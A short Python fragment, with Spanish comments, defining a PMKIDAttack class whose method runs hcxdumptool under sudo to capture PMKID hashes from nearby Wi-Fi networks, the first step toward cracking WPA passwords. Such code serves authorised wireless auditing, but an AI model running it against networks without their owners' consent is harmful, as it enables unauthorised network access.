class PMKIDAttack:
    def capture_hash(self, interface="wlan0mon"):
        # Usa hcxdumptool para capturar el hash PMKID
        cmd = ["sudo", "hcxdumptool", "-i", interface, "--enable_status=1"]
        print("[*] Capturando PMKID hashes... (Presiona Ctrl+C para parar)")
        subprocess.run(cmd)